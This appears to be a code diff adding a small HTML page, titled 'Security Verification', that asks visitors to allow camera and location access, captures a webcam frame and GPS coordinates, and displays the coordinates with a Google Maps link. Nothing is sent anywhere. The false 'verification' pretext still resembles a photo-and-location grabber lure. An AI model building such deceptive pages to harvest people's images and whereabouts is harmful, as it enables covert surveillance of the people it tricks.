@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verification Page</title>
+</head>
+<body style="text-align:center; font-family:Arial; padding:30px;">
+
+  <h2>Security Verification</h2>
+  <p>Please allow camera & location for verification.</p>
+
+  <video id="video" autoplay style="width:250px;"></video><br><br>
+  <button onclick="capture()">Capture Photo & Location</button>
+
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <p id="output"></p>
+
+  <script>
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => video.srcObject = stream);
+
+    function capture() {
+      const canvas = document.getElementById('canvas');
+      const video = document.getElementById('video');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      const image = canvas.toDataURL("image/png");
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        document.getElementById("output").innerHTML =
+          "✅ Location Captured<br>" +
+          "Latitude: " + lat + "<br>" +
+          "Longitude: " + lon + "<br><br>" +
+          "<a href='https://www.google.com/maps?q=" + lat + "," + lon + "' target='_blank'>📍 View on Google Maps</a>";
+      });
+    }
+  </script>
+
+</body>
+</html>
